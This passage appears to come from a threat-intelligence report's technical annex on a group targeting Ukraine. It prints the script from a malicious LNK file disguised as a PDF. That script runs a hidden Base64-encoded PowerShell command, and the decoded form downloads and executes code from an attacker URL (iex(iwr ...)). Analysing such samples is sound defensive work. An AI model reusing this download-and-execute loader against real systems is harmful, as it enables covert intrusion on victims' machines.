@@ -1,0 +1,7 @@
+
+While this specific group is primarily a threat to Ukraine, nascent threats to Ukraine have previously become international concerns and bear monitoring.
+Technical Annex The LNK file (SPEC-10T-MK2-000-ISS-4.10-09-2018-STANDARD.pdf.lnk [MD5: ec0fb9d17ec77ad05f9a69879327e2f9]) included the following script (Figure 4) to execute a PowerShell script with Base64-encoded script: vbscript:Execute(\"CreateObject(\"\"Wscript.
+Shell\"\").Run \"\"powershell -e \"\"\"\"aQBlAHgAKABpAHcAcgAgAC0AdQBzAGUAYgAgAGgAdAB0AHAAOgAvAC8AcwBpAG4Ab wBwAH QAaQBrAC4AdwBlAGIAcwBpAHQAZQAvAEUAdQBjAHoAUwBjACkAIAA=\"\"\"\"\"\", 0 : window.close\") Figure 4:
+LNK file script The following command (Figure 5) was received after decoding the Base64-encoded string: vbscript:Execute(\"CreateObject(\"\"Wscript.
+Shell\"\").Run \"\"powershell -e iex(iwr -useb
+http://sinoptik[.]website/EuczSc)\"\", 0 : window.close\") Figure 5: LNK file command The PowerShell script sends a request to URL \"http://sinoptik[.]website/EuczSc.\"
